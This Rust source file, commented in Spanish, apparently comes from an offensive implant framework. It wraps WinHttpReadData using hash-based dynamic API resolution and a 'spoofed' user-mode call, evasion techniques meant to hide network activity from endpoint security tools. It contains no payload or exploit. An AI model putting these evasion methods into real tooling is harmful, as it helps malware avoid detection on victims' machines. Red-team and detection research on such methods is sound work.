use crate::nt::types::*;
use crate::techniques::evasion::dinamic_api_resolution::get_winhttp_base;
use crate::techniques::evasion::execution::user_mode_call::user_mode_call_with_spoof;

// Documentación oficial:
// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpreaddata

// Lee datos del cuerpo HTTP
pub fn win_http_read_data(
    h_request: HINTERNET,               // in - handle petición http recibida
    lp_buffer: LPVOID,                  // out - buffer donde escribir datos
    dw_number_of_bytes_to_read: DWORD,  // in - número bytes a leer
    lpdw_number_of_bytes_read: LPDWORD, // out - bytes leídos en realidad
) -> Result<(), String> { // ret - éxito o mensaje error
    let api_hash = 0x9410ef50; // unique_hash("WinHttpReadData")
    let winhttp_base = unsafe { get_winhttp_base().map_err(|e| e.to_string())? };

    let status = user_mode_call_with_spoof(
        winhttp_base,
        api_hash,
        h_request as usize,
        lp_buffer as usize,
        dw_number_of_bytes_to_read as usize,
        lpdw_number_of_bytes_read as usize,
        0,
        0,
        0,
        0,
    )?;

    if status == 0 {
        Err(String::from("WinHttpReadData falló (retornó FALSE)"))
    } else {
        Ok(())
    }
}
